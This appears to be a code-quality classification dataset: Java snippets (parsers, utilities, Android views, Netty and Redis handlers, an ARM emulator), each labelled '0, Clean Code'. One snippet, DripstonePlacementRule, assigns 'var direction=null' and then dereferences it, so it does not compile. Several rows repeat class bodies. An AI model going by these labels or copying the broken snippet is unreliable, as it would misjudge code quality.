 * @param comparator integrated comparator
 */
  private void innerCompare(  Class<?> clazz,  Object left,  Object right,  List<Path> paths,  IntegratedComparator comparator){
    Field[] fields=clazz.getDeclaredFields();
    for (    Field field : fields) {
      if (field.isSynthetic() || isTransient(field.getModifiers()) || isStatic(field.getModifiers())) {
        continue;
      }
      boolean accessible=field.isAccessible();
      try {
        field.setAccessible(true);
        comparator.dispatch(field.get(left),field.get(right),comparator.declarePath(paths,field.getName()));
      }
 catch (      Exception e) {
        throw new RuntimeException(""illegal access with filed"",e);
      }
 finally {
        field.setAccessible(accessible);
      }
    }
    Class<?> superClazz=clazz.getSuperclass();
    while (superClazz != null && superClazz != Object.class) {
      innerCompare(superClazz,left,right,paths,comparator);
      superClazz=superClazz.getSuperclass();
    }
  }
}
",0,Clean Code
"/** 
 * 正则工具类
 * @author 13
 * @qq交流群 796794009
 * @email 2449207463@qq.com
 * @link http://13blog.site
 */
public class PatternUtil {
  /** 
 * 匹配邮箱正则
 */
  private static final Pattern VALID_EMAIL_ADDRESS_REGEX=Pattern.compile(""^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,6}$"",Pattern.CASE_INSENSITIVE);
  /** 
 * 验证只包含中英文和数字的字符串
 * @param keyword
 * @return
 */
  public static Boolean validKeyword(  String keyword){
    String regex=""^[a-zA-Z0-9\u4E00-\u9FA5]+$"";
    Pattern pattern=Pattern.compile(regex);
    Matcher match=pattern.matcher(keyword);
    return match.matches();
  }
  /** 
 * 判断是否是邮箱
 * @param emailStr
 * @return
 */
  public static boolean isEmail(  String emailStr){
    Matcher matcher=VALID_EMAIL_ADDRESS_REGEX.matcher(emailStr);
    return matcher.find();
  }
  /** 
 * 判断是否是网址
 * @param urlString
 * @return
 */
  public static boolean isURL(  String urlString){
    String regex=""^([hH][tT]{2}[pP]:/*|[hH][tT]{2}[pP][sS]:/*|[fF][tT][pP]:/*)(([A-Za-z0-9-~]+).)+([A-Za-z0-9-~\\/])+(\\?{0,1}(([A-Za-z0-9-~]+\\={0,1})([A-Za-z0-9-~]*)\\&{0,1})*)$"";
    Pattern pattern=Pattern.compile(regex);
    if (pattern.matcher(urlString).matches()) {
      return true;
    }
 else {
      return false;
    }
  }
}
",0,Clean Code
"/** 
 * A class that allows  {@link DataLoadProvider}s to be registered and retrieved by the data and resource classes they provide encoders and decoders for.
 */
public class DataLoadProviderRegistry {
  private static final MultiClassKey GET_KEY=new MultiClassKey();
  private final Map<MultiClassKey,DataLoadProvider<?,?>> providers=new HashMap<MultiClassKey,DataLoadProvider<?,?>>();
  /** 
 * Registers the given  {@link DataLoadProvider} using the given classes so it can laterbe retrieved using the given classes.
 * @param dataClass The class of the data that the provider provides encoders and decoders for.
 * @param resourceClass The class of the resource that the provider provides encoders and decoders for.
 * @param provider The provider.
 * @param < T > The type of the data that the provider provides encoders and decoders for.
 * @param < Z > The type of the resource that the provider provides encoders and decoders for.
 */
  public <T,Z>void register(  Class<T> dataClass,  Class<Z> resourceClass,  DataLoadProvider<T,Z> provider){
    providers.put(new MultiClassKey(dataClass,resourceClass),provider);
  }
  /** 
 * Returns the currently registered  {@link DataLoadProvider} for the given classes.
 * @param dataClass The class of the data that the provider provides encoders and decoders for.
 * @param resourceClass The class of the resource that the provider provides encoders and decoders for.
 * @param < T > The type of the data that the provider provides encoders and decoders for.
 * @param < Z > The type of the resource that the provider provides encoders and decoders for.
 */
  @SuppressWarnings(""unchecked"") public <T,Z>DataLoadProvider<T,Z> get(  Class<T> dataClass,  Class<Z> resourceClass){
    DataLoadProvider<?,?> result;
synchronized (GET_KEY) {
      GET_KEY.set(dataClass,resourceClass);
      result=providers.get(GET_KEY);
    }
    if (result == null) {
      result=EmptyDataLoadProvider.get();
    }
    return (DataLoadProvider<T,Z>)result;
  }
}
",0,Clean Code
"static class LogWriter extends Writer {
  private Logger _log;
  private StringBuilder _sb=new StringBuilder();
  LogWriter(  Logger log){
    _log=log;
  }
  public void write(  char ch){
    if (ch == '\n' && _sb.length() > 0) {
      _log.fine(_sb.toString());
      _sb.setLength(0);
    }
 else     _sb.append((char)ch);
  }
  public void write(  char[] buffer,  int offset,  int length){
    for (int i=0; i < length; i++) {
      char ch=buffer[offset + i];
      if (ch == '\n' && _sb.length() > 0) {
        _log.fine(_sb.toString());
        _sb.setLength(0);
      }
 else       _sb.append((char)ch);
    }
  }
  public void flush(){
  }
  public void close(){
  }
}
static class LogWriter extends Writer {
  private Logger _log;
  private StringBuilder _sb=new StringBuilder();
  LogWriter(  Logger log){
    _log=log;
  }
  public void write(  char ch){
    if (ch == '\n' && _sb.length() > 0) {
      _log.fine(_sb.toString());
      _sb.setLength(0);
    }
 else     _sb.append((char)ch);
  }
  public void write(  char[] buffer,  int offset,  int length){
    for (int i=0; i < length; i++) {
      char ch=buffer[offset + i];
      if (ch == '\n' && _sb.length() > 0) {
        _log.fine(_sb.toString());
        _sb.setLength(0);
      }
 else       _sb.append((char)ch);
    }
  }
  public void flush(){
  }
  public void close(){
  }
}
",0,Clean Code
"public class DripstonePlacementRule extends BlockPlacementRule {
  private static final String PROP_VERTICAL_DIRECTION=""vertical_direction"";
  private static final String PROP_THICKNESS=""thickness"";
  public DripstonePlacementRule(){
    super(Block.POINTED_DRIPSTONE);
  }
  @Override public @Nullable Block blockPlace(  @NotNull PlacementState placementState){
    var blockFace=Objects.requireNonNullElse(placementState.blockFace(),BlockFace.TOP);
    var direction=null;
    var thickness=getThickness(placementState.instance(),placementState.placePosition(),direction.equals(""up""));
    return block.withProperties(Map.of(PROP_VERTICAL_DIRECTION,direction,PROP_THICKNESS,thickness));
  }
  @Override public @NotNull Block blockUpdate(  @NotNull UpdateState updateState){
    var direction=updateState.currentBlock().getProperty(PROP_VERTICAL_DIRECTION).equals(""up"");
    var newThickness=getThickness(updateState.instance(),updateState.blockPosition(),direction);
    return updateState.currentBlock().withProperty(PROP_THICKNESS,newThickness);
  }
  private @NotNull String getThickness(  @NotNull Block.Getter instance,  @NotNull Point blockPosition,  boolean direction){
    var abovePosition=blockPosition.add(0,direction ? 1 : -1,0);
    var aboveBlock=instance.getBlock(abovePosition,Block.Getter.Condition.TYPE);
    if (aboveBlock.id() != Block.POINTED_DRIPSTONE.id())     return ""tip"";
    if ((direction ? ""down"" : ""up"").equals(aboveBlock.getProperty(PROP_VERTICAL_DIRECTION)))     return ""tip_merge"";
    var aboveThickness=aboveBlock.getProperty(PROP_THICKNESS);
    if (""tip"".equals(aboveThickness) || ""tip_merge"".equals(aboveThickness))     return ""frustum"";
    var belowPosition=blockPosition.add(0,direction ? -1 : 1,0);
    var belowBlock=instance.getBlock(belowPosition,Block.Getter.Condition.TYPE);
    if (belowBlock.id() != Block.POINTED_DRIPSTONE.id())     return ""base"";
    return ""middle"";
  }
  @Override public int maxUpdateDistance(){
    return 2;
  }
}
",0,Clean Code
"public class MuteGroupMemberActivity extends BasePickGroupMemberActivity {
  private MenuItem menuItem;
  private List<UIUserInfo> checkedGroupMembers;
  private boolean groupMuted=false;
  @Override protected void onGroupMemberChecked(  List<UIUserInfo> checkedUserInfos){
    this.checkedGroupMembers=checkedUserInfos;
    if (checkedUserInfos == null || checkedUserInfos.isEmpty()) {
      menuItem.setTitle(""确定"");
      menuItem.setEnabled(false);
    }
 else {
      menuItem.setTitle(""确定("" + checkedUserInfos.size() + "")"");
      menuItem.setEnabled(true);
    }
  }
  @Override protected void afterViews(){
    super.afterViews();
    groupMuted=getIntent().getBooleanExtra(""groupMuted"",false);
  }
  @Override protected int menu(){
    return R.menu.group_manage_add_manager;
  }
  @Override protected void afterMenus(  Menu menu){
    menuItem=menu.findItem(R.id.confirm);
    menuItem.setEnabled(false);
  }
  @Override public boolean onOptionsItemSelected(  MenuItem item){
    if (item.getItemId() == R.id.confirm) {
      muteOrAllowGroupMembers();
      return true;
    }
    return super.onOptionsItemSelected(item);
  }
  private void muteOrAllowGroupMembers(){
    GroupViewModel groupViewModel=ViewModelProviders.of(this).get(GroupViewModel.class);
    List<String> memberIds=new ArrayList<>(checkedGroupMembers.size());
    for (    UIUserInfo info : checkedGroupMembers) {
      memberIds.add(info.getUserInfo().uid);
    }
    MaterialDialog dialog=new MaterialDialog.Builder(this).content(groupMuted ? ""加入白名单中..."" : ""禁言中..."").progress(true,100).cancelable(false).build();
    dialog.show();
    Observer<OperateResult<Boolean>> observer=booleanOperateResult -> {
      dialog.dismiss();
      if (booleanOperateResult.isSuccess()) {
        finish();
      }
 else {
        Toast.makeText(this,groupMuted ? ""添加白名单错误"" : ""设置禁言错误 "" + booleanOperateResult.getErrorCode(),Toast.LENGTH_SHORT).show();
      }
    }
;
    if (groupMuted) {
      groupViewModel.allowGroupMember(groupInfo.target,true,memberIds,null,Collections.singletonList(0)).observe(this,observer);
    }
 else {
      groupViewModel.muteGroupMember(groupInfo.target,true,memberIds,null,Collections.singletonList(0)).observe(this,observer);
    }
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class Inputs {
  public static Input getInput(  final InputBuf inputBuf){
    if (UnsafeUtil.hasUnsafe() && inputBuf.hasMemoryAddress()) {
      return new UnsafeNioBufInput(inputBuf.nioByteBuffer(),true);
    }
    return new NioBufInput(inputBuf.nioByteBuffer(),true);
  }
  public static Input getInput(  final ByteBuffer buf){
    if (UnsafeUtil.hasUnsafe() && buf.isDirect()) {
      return new UnsafeNioBufInput(buf,true);
    }
    return new NioBufInput(buf,true);
  }
  public static Input getInput(  final byte[] bytes,  final int offset,  final int length){
    return new ByteArrayInput(bytes,offset,length,true);
  }
  public static void checkLastTagWas(  final Input input,  final int value) throws ProtobufException {
    if (input instanceof UnsafeNioBufInput) {
      ((UnsafeNioBufInput)input).checkLastTagWas(value);
    }
 else     if (input instanceof NioBufInput) {
      ((NioBufInput)input).checkLastTagWas(value);
    }
 else     if (input instanceof ByteArrayInput) {
      ((ByteArrayInput)input).checkLastTagWas(value);
    }
  }
  private Inputs(){
  }
}
",0,Clean Code
"public class UdfTreeUtils {
  /** 
 * Build tree structure 
 */
  public List<UdfTreeEntity> udfTreeList=new ArrayList<>();
  /** 
 * Construction method 
 */
  public UdfTreeUtils(  List<UdfTreeEntity> udfTreeList){
    this.udfTreeList=udfTreeList;
  }
  /** 
 * Obtain all root nodes (top-level nodes) that need to be built
 * @return All Root Node List Collection
 */
  public List<UdfTreeEntity> getRootNode(){
    List<UdfTreeEntity> rootudfTreeList=new ArrayList<>();
    for (    UdfTreeEntity UdfTreeEntity : udfTreeList) {
      if (-1 == UdfTreeEntity.getParent()) {
        rootudfTreeList.add(UdfTreeEntity);
      }
    }
    return rootudfTreeList;
  }
  /** 
 * Build a tree structure according to each top-level node (root node)
 * @return Build the entire tree
 */
  public List<UdfTreeEntity> buildTree(){
    List<UdfTreeEntity> UdfTreeEntitys=new ArrayList<UdfTreeEntity>();
    for (    UdfTreeEntity treeRootNode : getRootNode()) {
      treeRootNode=buildChildTree(treeRootNode);
      UdfTreeEntitys.add(treeRootNode);
    }
    return UdfTreeEntitys;
  }
  /** 
 * Recursion ----- construct sub tree structure
 * @param udfTreeEntity Root node (top-level node)
 * @return Whole tree
 */
  public UdfTreeEntity buildChildTree(  UdfTreeEntity udfTreeEntity){
    List<UdfTreeEntity> childTree=new ArrayList<UdfTreeEntity>();
    for (    UdfTreeEntity UdfTreeEntity : udfTreeList) {
      if (UdfTreeEntity.getParent().equals(udfTreeEntity.getId())) {
        childTree.add(buildChildTree(UdfTreeEntity));
      }
    }
    udfTreeEntity.setChildrenList(childTree);
    return udfTreeEntity;
  }
}",0,Clean Code
"public static class Create_table_options_mysql_itemContext extends ParserRuleContext {
  public TerminalNode T_AUTO_INCREMENT(){
    return getToken(HiveSqlParser.T_AUTO_INCREMENT,0);
  }
  public ExprContext expr(){
    return getRuleContext(ExprContext.class,0);
  }
  public TerminalNode T_EQUAL(){
    return getToken(HiveSqlParser.T_EQUAL,0);
  }
  public TerminalNode T_COMMENT(){
    return getToken(HiveSqlParser.T_COMMENT,0);
  }
  public TerminalNode T_CHARACTER(){
    return getToken(HiveSqlParser.T_CHARACTER,0);
  }
  public TerminalNode T_SET(){
    return getToken(HiveSqlParser.T_SET,0);
  }
  public TerminalNode T_CHARSET(){
    return getToken(HiveSqlParser.T_CHARSET,0);
  }
  public TerminalNode T_DEFAULT(){
    return getToken(HiveSqlParser.T_DEFAULT,0);
  }
  public TerminalNode T_ENGINE(){
    return getToken(HiveSqlParser.T_ENGINE,0);
  }
  public Create_table_options_mysql_itemContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_create_table_options_mysql_item;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterCreate_table_options_mysql_item(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitCreate_table_options_mysql_item(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitCreate_table_options_mysql_item(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"/** 
 * @author : leix.xie
 * @date : 2019/3/6 17:48
 */
@Name(BistouryConstants.REQ_JAR_CLASS_PATH) public class JarDebugPathCommand extends AnnotatedCommand {
  private static final Logger logger=BistouryLoggger.getLogger();
  private String className;
  @Argument(index=0,argName=""className"") public void setClassName(  final String className){
    this.className=URLCoder.decode(className);
  }
  @Override public void process(  CommandProcess process){
    logger.info(""receive jar class path command, className: "" + className);
    CodeProcessResponse<ClassInfo> codeResponse=new CodeProcessResponse<>();
    TypeResponse<ClassInfo> typeResponse=new TypeResponse<>();
    typeResponse.setType(BistouryConstants.REQ_JAR_CLASS_PATH);
    typeResponse.setData(codeResponse);
    try {
      JarDebugClient client=JarDebugClients.getInstance();
      ClassInfo classInfo=client.getClassPath(className);
      codeResponse.setCode(0);
      codeResponse.setId(className);
      codeResponse.setData(classInfo);
    }
 catch (    Exception e) {
      logger.error("""",""get jar class path error, className: "" + className,e);
      codeResponse.setCode(-1);
      codeResponse.setMessage(""获取类路径失败，"" + e.getMessage());
    }
 finally {
      process.write(URLCoder.encode(AttachJacksonSerializer.serialize(typeResponse)));
      process.end();
    }
  }
}
",0,Clean Code
"public final class ConsumerVO implements Comparable<ConsumerVO> {
  private final String groupId;
  private final Map<String,ConsumerTopicVO> topics=new TreeMap<>();
  public ConsumerVO(  String groupId){
    Validate.notEmpty(""groupId is required"");
    this.groupId=groupId;
  }
  public String getGroupId(){
    return groupId;
  }
  public void addTopic(  ConsumerTopicVO topic){
    topics.put(topic.getTopic(),topic);
  }
  public ConsumerTopicVO getTopic(  String topic){
    return topics.get(topic);
  }
  public Collection<ConsumerTopicVO> getTopics(){
    return topics.values();
  }
  @Override public int compareTo(  ConsumerVO that){
    return this.groupId.compareTo(that.groupId);
  }
  @Override public boolean equals(  Object o){
    if (this == o) {
      return true;
    }
 else     if (o instanceof ConsumerVO) {
      final var that=(ConsumerVO)o;
      return Objects.equals(groupId,that.groupId);
    }
 else {
      return false;
    }
  }
  @Override public int hashCode(){
    return Objects.hashCode(groupId);
  }
}
",0,Clean Code
"class myFileFilter extends FileFilter {
  private String fileExtension;
  myFileFilter(  String fileExtension){
    if (!fileExtension.startsWith(""."")) {
      fileExtension=""."" + fileExtension;
    }
    this.fileExtension=fileExtension;
  }
  public String getDescription(){
    return fileExtension;
  }
  public boolean accept(  File file){
    String name=file.getName();
    return file.isDirectory() || name.toLowerCase().endsWith(fileExtension.toLowerCase());
  }
}
public class MyFileFilter extends FileFilter {
  private String extension;
  public MyFileFilter(  String extension){
    if (!extension.startsWith(""."")) {
      extension=""."" + extension;
    }
    this.extension=extension;
  }
  @Override public String getDescription(){
    return ""*"" + extension;
  }
  @Override public boolean accept(  File file){
    String name=file.getName();
    return file.isDirectory() || name.toLowerCase().endsWith(extension);
  }
}
",0,Clean Code
"/** 
 * android arm emulator Created by zhkl0228 on 2017/5/2.
 */
public class AndroidARMEmulator extends AbstractARMEmulator<AndroidFileIO> implements AndroidEmulator {
  protected AndroidARMEmulator(  String processName,  File rootDir,  Collection<BackendFactory> backendFactories){
    super(processName,rootDir,Family.Android32,backendFactories);
  }
  @Override protected FileSystem<AndroidFileIO> createFileSystem(  File rootDir){
    return new LinuxFileSystem(this,rootDir);
  }
  @Override protected Memory createMemory(  UnixSyscallHandler<AndroidFileIO> syscallHandler,  String[] envs){
    return new AndroidElfLoader(this,syscallHandler);
  }
  @Override protected Dlfcn createDyld(  SvcMemory svcMemory){
    return new ArmLD(backend,svcMemory);
  }
  @Override protected UnixSyscallHandler<AndroidFileIO> createSyscallHandler(  SvcMemory svcMemory){
    return new ARM32SyscallHandler(svcMemory);
  }
  private VM createDalvikVMInternal(  File apkFile){
    return new DalvikVM(this,apkFile);
  }
  /** 
 * https://github.com/lunixbochs/usercorn/blob/master/go/arch/arm/linux.go
 */
  @Override protected final void setupTraps(){
    super.setupTraps();
    int __kuser_memory_barrier=0xe12fff1e;
    memory.pointer(0xffff0fa0L).setInt(0,__kuser_memory_barrier);
    ByteBuffer buffer=ByteBuffer.allocate(32);
    buffer.order(ByteOrder.LITTLE_ENDIAN);
    buffer.putInt(0xf57ff05f);
    buffer.putInt(0xe1923f9f);
    buffer.putInt(0xe0533000);
    buffer.putInt(0x01823f91);
    buffer.putInt(0x03330001);
    buffer.putInt(0x0afffffa);
    buffer.putInt(0xe2730000);
    buffer.putInt(0xeaffffef);
    byte[] __kuser_cmpxchg=buffer.array();
    memory.pointer(0xffff0fc0L).write(__kuser_cmpxchg);
  }
  @Override public LibraryFile createURLibraryFile(  URL url,  String libName){
    return new URLibraryFile(url,libName,-1,false);
  }
  @Override protected boolean isPaddingArgument(){
    return true;
  }
  private VM vm;
  @Override public VM createDalvikVM(){
    return createDalvikVM((File)null);
  }
  @Override public final VM createDalvikVM(  File apkFile){
    if (vm != null) {
      throw new IllegalStateException(""vm is already created"");
    }
    vm=createDalvikVMInternal(apkFile);
    return vm;
  }
  @Override public VM createDalvikVM(  Class<?> callingClass){
    return createDalvikVM(new File(callingClass.getProtectionDomain().getCodeSource().getLocation().getPath()));
  }
  @Override public final VM getDalvikVM(){
    return vm;
  }
  @Override public Unwinder getUnwinder(){
    return new AndroidARMUnwinder(this);
  }
}
",0,Clean Code
"/** 
 * @author zhenyu.nie created on 2018 2018/10/15 18:55
 */
public class ArthasTask implements Task {
  private static final Logger logger=LoggerFactory.getLogger(ArthasTask.class);
  private static final ListeningExecutorService SHUTDOWN_EXECUTOR=MoreExecutors.listeningDecorator(Executors.newSingleThreadExecutor(new NamedThreadFactory(""shutdown_attach"")));
  private static final Set<String> SHUTDOWN_COMMANDS=ImmutableSet.of(BistouryConstants.SHUTDOWN_COMMAND,BistouryConstants.STOP_COMMAND);
  private final TelnetStore telnetStore;
  private final String id;
  private final long maxRunningMs;
  private final int pid;
  private final String command;
  private final ResponseHandler handler;
  private final SettableFuture<Integer> future=SettableFuture.create();
  public ArthasTask(  TelnetStore telnetStore,  String id,  long maxRunningMs,  int pid,  String command,  ResponseHandler handler){
    this.telnetStore=telnetStore;
    this.id=id;
    this.maxRunningMs=maxRunningMs;
    this.pid=pid;
    this.command=command;
    this.handler=handler;
  }
  @Override public String getId(){
    return id;
  }
  @Override public long getMaxRunningMs(){
    return maxRunningMs;
  }
  @Override public ContinueResponseJob createJob(){
    if (isShutdownCommand(command.trim())) {
      return new Job(SHUTDOWN_EXECUTOR);
    }
 else {
      return new Job(AgentRemotingExecutor.getExecutor());
    }
  }
  @Override public ListenableFuture<Integer> getResultFuture(){
    return future;
  }
  private boolean isShutdownCommand(  String realCommand){
    return SHUTDOWN_COMMANDS.contains(realCommand);
  }
private class Job implements ContinueResponseJob {
    private final ListeningExecutorService executor;
    private Telnet telnet;
    private Job(    ListeningExecutorService executor){
      this.executor=executor;
    }
    @Override public String getId(){
      return id;
    }
    @Override public void init() throws Exception {
      telnet=telnetStore.getTelnet(pid);
      telnet.write(command);
    }
    @Override public boolean doResponse() throws Exception {
      byte[] bytes=telnet.read();
      if (bytes == null) {
        return true;
      }
      if (bytes.length > 0) {
        handler.handle(bytes);
      }
      return false;
    }
    @Override public void clear(){
      if (telnet != null) {
        telnet.close();
      }
    }
    @Override public void finish() throws Exception {
      future.set(0);
    }
    @Override public void error(    Throwable t){
      future.setException(t);
    }
    @Override public void cancel(){
      future.cancel(true);
    }
    @Override public ListeningExecutorService getExecutor(){
      return executor;
    }
  }
}
",0,Clean Code
"/** 
 * @author enjoyyin
 * @date 2022-04-14
 * @since 1.1.0
 */
@Component public class DevelopmentAppConnQualityChecker extends AbstractAppConnQualityChecker {
  public DevelopmentAppConnQualityChecker(){
    super(AppConnConf.DEVELOPMENT_QUALITY_CHECKER_IGNORE_LIST.getValue());
  }
  @Override protected void checkAppConnQuality(  AppConn appConn) throws AppConnQualityErrorException {
    if (!(appConn instanceof OnlyDevelopmentAppConn)) {
      return;
    }
    String appConnName=appConn.getAppDesc().getAppName();
    checkAppInstance(appConn);
    AppInstance appInstance=appConn.getAppDesc().getAppInstances().get(0);
    DevelopmentIntegrationStandard developmentIntegrationStandard=((OnlyDevelopmentAppConn)appConn).getOrCreateDevelopmentStandard();
    checkNull(developmentIntegrationStandard,appConnName,""developmentStandard"");
    RefExecutionService refExecutionService=developmentIntegrationStandard.getRefExecutionService(appInstance);
    checkNull(refExecutionService,appConnName,""refExecutionService"");
    checkNull(refExecutionService.getRefExecutionOperation(),appConnName,""refExecutionOperation"");
    checkBoolean(developmentIntegrationStandard.getRefCRUDService(appInstance) != null && developmentIntegrationStandard.getRefImportService(appInstance) == null,appConnName,""RefImportService is needed since refCRUDService is exists."");
    checkBoolean(developmentIntegrationStandard.getRefCRUDService(appInstance) != null && developmentIntegrationStandard.getRefExportService(appInstance) == null,appConnName,""RefExportService is needed since refCRUDService is exists."");
    RefCRUDService refCRUDService=developmentIntegrationStandard.getRefCRUDService(appInstance);
    if (refCRUDService == null) {
      return;
    }
    checkNull(refCRUDService.getRefUpdateOperation(),appConnName,""refUpdateOperation"");
    checkNull(refCRUDService.getRefCopyOperation(),appConnName,""refCopyOperation"");
    checkNull(refCRUDService.getRefDeletionOperation(),appConnName,""refDeletionOperation"");
    checkNull(developmentIntegrationStandard.getRefImportService(appInstance).getRefImportOperation(),appConnName,""refImportOperation"");
    checkNull(developmentIntegrationStandard.getRefExportService(appInstance).getRefExportOperation(),appConnName,""refExportOperation"");
  }
}
",0,Clean Code
"class SelectViewHolder extends RecyclerView.ViewHolder {
  TextView name;
  ImageView selectedIcon;
  public SelectViewHolder(  @NonNull View itemView){
    super(itemView);
    name=itemView.findViewById(com.tencent.qcloud.tuikit.timcommon.R.id.name);
    selectedIcon=itemView.findViewById(com.tencent.qcloud.tuikit.timcommon.R.id.selected_icon);
  }
}
class SelectViewHolder extends RecyclerView.ViewHolder {
  TextView name;
  TextView subName;
  ImageView selectedIcon;
  public SelectViewHolder(  @NonNull View itemView){
    super(itemView);
    name=itemView.findViewById(com.tencent.qcloud.tuikit.timcommon.R.id.name);
    subName=itemView.findViewById(com.tencent.qcloud.tuikit.timcommon.R.id.sub_name);
    selectedIcon=itemView.findViewById(com.tencent.qcloud.tuikit.timcommon.R.id.selected_icon);
  }
}
class SelectViewHolder extends RecyclerView.ViewHolder {
  TextView name;
  ImageView selectedIcon;
  FrameLayout frame;
  RelativeLayout content;
  public SelectViewHolder(  @NonNull View itemView){
    super(itemView);
    name=itemView.findViewById(R.id.name);
    selectedIcon=itemView.findViewById(R.id.selected_icon);
    frame=itemView.findViewById(R.id.item_frame);
    content=itemView.findViewById(R.id.item_content);
    itemView.setClipToOutline(true);
    frame.setClipToOutline(true);
    content.setClipToOutline(true);
  }
}
",0,Clean Code
"/** 
 * <p>@ProjectName:     NettyChat</p> <p>@ClassName:       LoginAuthRespHandler.java</p> <p>@PackageName:     com.freddy.im</p> <b> <p>@Description:     握手认证消息响应处理handler</p> </b> <p>@author:          FreddyChen</p> <p>@date:            2019/04/07 23:11</p> <p>@email:           chenshichao@outlook.com</p>
 */
public class LoginAuthRespHandler extends ChannelInboundHandlerAdapter {
  private NettyTcpClient imsClient;
  public LoginAuthRespHandler(  NettyTcpClient imsClient){
    this.imsClient=imsClient;
  }
  @Override public void channelRead(  ChannelHandlerContext ctx,  Object msg) throws Exception {
    MessageProtobuf.Msg handshakeRespMsg=(MessageProtobuf.Msg)msg;
    if (handshakeRespMsg == null || handshakeRespMsg.getHead() == null) {
      return;
    }
    MessageProtobuf.Msg handshakeMsg=imsClient.getHandshakeMsg();
    if (handshakeMsg == null || handshakeMsg.getHead() == null) {
      return;
    }
    int handshakeMsgType=handshakeMsg.getHead().getMsgType();
    if (handshakeMsgType == handshakeRespMsg.getHead().getMsgType()) {
      System.out.println(""收到服务端握手响应消息，message="" + handshakeRespMsg);
      int status=-1;
      try {
        JSONObject jsonObj=JSON.parseObject(handshakeRespMsg.getHead().getExtend());
        status=jsonObj.getIntValue(""status"");
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
 finally {
        if (status == 1) {
          MessageProtobuf.Msg heartbeatMsg=imsClient.getHeartbeatMsg();
          if (heartbeatMsg == null) {
            return;
          }
          imsClient.getMsgTimeoutTimerManager().onResetConnected();
          System.out.println(""发送心跳消息："" + heartbeatMsg + ""当前心跳间隔为：""+ imsClient.getHeartbeatInterval()+ ""ms\n"");
          imsClient.sendMsg(heartbeatMsg);
          imsClient.addHeartbeatHandler();
        }
 else {
          imsClient.close();
        }
      }
    }
 else {
      ctx.fireChannelRead(msg);
    }
  }
}
",0,Clean Code
"public static class Update_tableContext extends ParserRuleContext {
  public Table_nameContext table_name(){
    return getRuleContext(Table_nameContext.class,0);
  }
  public TerminalNode T_OPEN_P(){
    return getToken(HiveSqlParser.T_OPEN_P,0);
  }
  public Select_stmtContext select_stmt(){
    return getRuleContext(Select_stmtContext.class,0);
  }
  public TerminalNode T_CLOSE_P(){
    return getToken(HiveSqlParser.T_CLOSE_P,0);
  }
  public IdentContext ident(){
    return getRuleContext(IdentContext.class,0);
  }
  public From_clauseContext from_clause(){
    return getRuleContext(From_clauseContext.class,0);
  }
  public TerminalNode T_AS(){
    return getToken(HiveSqlParser.T_AS,0);
  }
  public Update_tableContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_update_table;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterUpdate_table(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitUpdate_table(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitUpdate_table(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"/** 
 * Interface for a binary output destination that may be augmented with textual annotations. 
 */
public interface AnnotatedOutput extends Output {
  /** 
 * Get whether this instance will actually keep annotations.
 * @return {@code true} iff annotations are being kept
 */
  boolean annotates();
  /** 
 * Get whether this instance is intended to keep verbose annotations. Annotators may use the result of calling this method to inform their annotation activity.
 * @return {@code true} iff annotations are to be verbose
 */
  boolean isVerbose();
  /** 
 * Add an annotation for the subsequent output. Any previously open annotation will be closed by this call, and the new annotation marks all subsequent output until another annotation call.
 * @param msg {@code non-null;} the annotation message
 */
  void annotate(  String msg);
  /** 
 * Add an annotation for a specified amount of subsequent output. Any previously open annotation will be closed by this call. If there is already pending annotation from one or more previous calls to this method, the new call ""consumes"" output after all the output covered by the previous calls.
 * @param amt {@code >= 0;} the amount of output for this annotation to cover
 * @param msg {@code non-null;} the annotation message
 */
  void annotate(  int amt,  String msg);
  /** 
 * End the most recent annotation. Subsequent output will be unannotated, until the next call to {@link #annotate}.
 */
  void endAnnotation();
  /** 
 * Get the maximum width of the annotated output. This is advisory: Implementations of this interface are encouraged to deal with too-wide output, but annotaters are encouraged to attempt to avoid exceeding the indicated width.
 * @return {@code >= 1;} the maximum width
 */
  int getAnnotationWidth();
}
",0,Clean Code
"/** 
 * 自定义RedisBolt 利用Redis的哈希数据结构的hincrby key field功能进行词频统计
 */
public class RedisCountStoreBolt extends AbstractRedisBolt {
  private final RedisStoreMapper storeMapper;
  private final RedisDataTypeDescription.RedisDataType dataType;
  private final String additionalKey;
  public RedisCountStoreBolt(  JedisPoolConfig config,  RedisStoreMapper storeMapper){
    super(config);
    this.storeMapper=storeMapper;
    RedisDataTypeDescription dataTypeDescription=storeMapper.getDataTypeDescription();
    this.dataType=dataTypeDescription.getDataType();
    this.additionalKey=dataTypeDescription.getAdditionalKey();
  }
  @Override protected void process(  Tuple tuple){
    String key=storeMapper.getKeyFromTuple(tuple);
    String value=storeMapper.getValueFromTuple(tuple);
    JedisCommands jedisCommand=null;
    try {
      jedisCommand=getInstance();
      if (dataType == RedisDataTypeDescription.RedisDataType.HASH) {
        jedisCommand.hincrBy(additionalKey,key,Long.valueOf(value));
      }
 else {
        throw new IllegalArgumentException(""Cannot process such data type for Count: "" + dataType);
      }
      collector.ack(tuple);
    }
 catch (    Exception e) {
      this.collector.reportError(e);
      this.collector.fail(tuple);
    }
 finally {
      returnInstance(jedisCommand);
    }
  }
  @Override public void declareOutputFields(  OutputFieldsDeclarer declarer){
  }
}
",0,Clean Code
"class GitlabValidatorTest {
  private final GitlabClientFactory gitlabClientFactory=mock();
  private final ProjectAlmSettingDto projectAlmSettingDto=mock();
